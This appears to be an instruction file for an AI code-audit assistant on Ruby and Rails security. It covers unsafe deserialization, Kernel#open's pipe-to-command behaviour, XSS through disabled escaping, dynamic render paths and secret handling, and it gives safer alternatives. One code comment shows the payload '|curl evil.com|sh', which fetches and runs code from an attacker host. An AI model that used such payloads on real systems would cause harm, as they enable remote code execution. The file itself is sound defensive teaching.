# Ruby-specific vulnerabilities

> - This knowledge extends your judgment. Apply what fits the project and keep reasoning beyond the list.
> - Source: the official Ruby docs (`Marshal`, `Psych`/`YAML`, `command_injection.rdoc`, `security.rdoc`) and OWASP, <https://cheatsheetseries.owasp.org/>.

## Rules

- This skill audits and explains.
- By default, it never rewrites your code.

## What to look for

### Insecure deserialization via `Marshal.load` (and YAML / JSON gadget chains)

`Marshal.load` reconstructs arbitrary classes and can be driven to arbitrary command execution, so the docs warn never to pass it untrusted data. The dangerous pattern is a single line:

```ruby
obj = Marshal.load(untrusted)   # → RCE
```

The same property reaches the text formats that revive Ruby objects:

- **YAML / Psych.** `YAML.load` (on Psych ≤ 3, the historical default) and `Psych.load`/`unsafe_load` instantiate tagged Ruby objects. The universal gadget works here too, by swapping `Gem::Requirement` into the YAML payload. The docs state plainly that loading untrusted YAML can execute arbitrary code.
- **JSON.** `JSON.load` with `json/add` loaded revives typed objects from `json_class` tags. `JSON.parse` does not, so flag `JSON.load` of untrusted input, not `JSON.parse`.

The carrier is rarely an obvious upload, it is a trusted-looking one: a signed session cookie, a cache entry, a job payload, a message body. A hardcoded or leaked signing secret turns such a cookie into attacker-controlled input that reaches `Marshal.load` for full RCE. Trace the byte source to the sink, not just a literal `Marshal.load` call.

Safer shapes, applied where they fit:

- **Never `Marshal.load` untrusted data.** Use `JSON.parse` (not `JSON.load`) for data-only structures: it returns only primitive types and cannot instantiate arbitrary classes.
- For YAML use **`YAML.safe_load`** with an explicit `permitted_classes` allowlist. It deserializes only basic scalars, `Array`, and `Hash`, raising `Psych::DisallowedClass` on anything else. On **Psych 4 / Ruby 3.1+**, `YAML.load` is itself an alias of `safe_load` and safe by default. On older Rubies you must call `safe_load` explicitly.
- RuboCop's `Security/MarshalLoad`, `Security/YAMLLoad`, and `Security/JSONLoad` cops flag these sinks in CI. Signing the cookie only gates _who_ reaches the sink: it stays a full RCE primitive once the secret leaks or a trusted producer is compromised.

### `Kernel#open` / `URI.open` pipe-to-command quirk

Ruby's `Kernel#open` treats a leading `|` in its path argument as a **command to run in a subprocess**, returning that command's output (a documented Ruby behavior), so `open("|ls")` runs `ls`. The same `|`-honoring behavior applies to `IO.read`, `IO.write`, `IO.binread`, `IO.binwrite`, `IO.readlines`, `IO.foreach`, and `URI.open` (per the official `command_injection.rdoc`). Passing user-controlled data that can begin with `|` to any of these is command injection, even where no shell exec was intended:

```ruby
open(params[:path])   # path = "|curl evil.com|sh" → RCE
```

This quirk is also the _final sink_ in many Ruby deserialization gadget chains, where the chain ends by handing an attacker-built `"|cmd"` string to an `open`-style call. This pipe behavior is deprecated but still executes on current Rubies, so a reachable call is a live finding.

Safer shape: use the explicit, non-magical APIs.

- **`File.open` / `File.read`** for files: since Ruby 2.6 these (and `File.write`, `File.binread`, `File.binwrite`, `File.foreach`, `File.readlines`) no longer honor a leading `|`, so `File.open("|cmd")` raises `Errno::ENOENT` rather than running a command.
- **`IO.popen`** only when you genuinely intend to run a command, with a fixed binary and an argument array, never a string built from input.
- **`URI.parse(url).open`** for URLs, so the value is parsed as a URI, not a possible command.
- RuboCop `Security/Open` flags `open`/`URI.open` with dynamic input. Watch `Open3.*` methods, and any `IO.*` reader fed user data, on the same path.

### Rails: do not switch off the framework's auto-escaping

Rails is secure by default, and the recurring Rails finding is code that opens a default back up. ERB views auto-escape interpolated strings, and `raw`, `html_safe`, and the `<%== %>` tag all disable that escaping, so reaching any of them with untrusted data is XSS (`String#html_safe` is unsafe despite its name). A related footgun is `link_to "label", @user.website`: on older Rails a stored `javascript:` URL in that argument becomes a clickable script sink.

Safer shape: render through the auto-escaping default. When users must supply rich text, accept a markup language (Markdown, textile) and disallow raw HTML, or constrain it with `#sanitize` (an allowlist, known to be imperfect) plus CSP. Validate that a URL passed to `link_to` uses an `http`/`https` scheme before rendering it.

### Rails: dynamic render paths

A controller or view that builds the `render` target from user input lets an attacker choose which template or partial is rendered, reaching a view they should not see (an administrative page, a partial with secrets). The template name itself is the injection point.

Safer shape: never let user input name the view. Map an allowlisted key to a fixed template, or hard-code the render target, so the set of renderable views is closed.

### Rails: defaults, routes, and object access

Several Rails behaviors need an explicit decision, not a code fix. Rails ships **no built-in object-level authorization**: its RESTful URLs are guessable, so without a per-object check a user reaches another user's record (IDOR / forceful browsing). A wildcard route like `match ':controller(/:action(/:id))'` exposes every public controller method as an action, widening the attack surface far past what was intended. And the framework's signing secret (`secret_key_base`, historically `secret_token.rb`) is what makes the deserialization cookie above reachable, so a shared, committed, or guessable one reopens that RCE.

Safer shape: enforce object-level authorization explicitly, preferably with a policy library (Pundit, CanCanCan), on every action that loads a record. Keep `config/routes.rb` to the specific routes the app needs, never a catch-all controller/action wildcard. Keep `secret_key_base` and sensitive files (`config/database.yml`, `config/secrets`, `db/seeds.rb`, dev databases) out of source control, in environment variables or Rails credentials. Run Brakeman in CI: it is the canonical Rails static analyzer for exactly these patterns.

## How to act on the result

- **In detect (detection):** each pattern you confirm is a finding. Describe it in plain language: what it is (the Ruby behavior being abused, for example a deserialization sink that revives live objects), why it matters (the concrete impact, such as remote code execution via a gadget chain), and the evidence (the call, template, route, or setting, and the source of its bytes). Trace the source to the sink, including through a trusted-looking carrier (a cookie, a cache entry), per the risk blocks above. It flows through detect's normal steps and is tracked like any other finding.
- **In verify (proof):** the control holds only when the unsafe path is gone or properly guarded: untrusted data parsed with `JSON.parse` instead of `Marshal.load`/`JSON.load`, YAML loaded through `YAML.safe_load` with a `permitted_classes` allowlist (or `YAML.load` on Psych 4+), file/URL access moved to `File.open`/`URI.parse(url).open` so a leading `|` can never run a command, Rails auto-escaping left on (no `raw`/`html_safe` on untrusted data), the `render` target allowlisted, object-level authorization enforced, routes scoped, and `secret_key_base` kept out of source control. A shared signing secret around a `Marshal`/`YAML` cookie, an `open` call still reachable by user input, or a Rails default still open, does not close the risk. If the dangerous pattern still reaches untrusted input, record it as not closed and point back to harden.
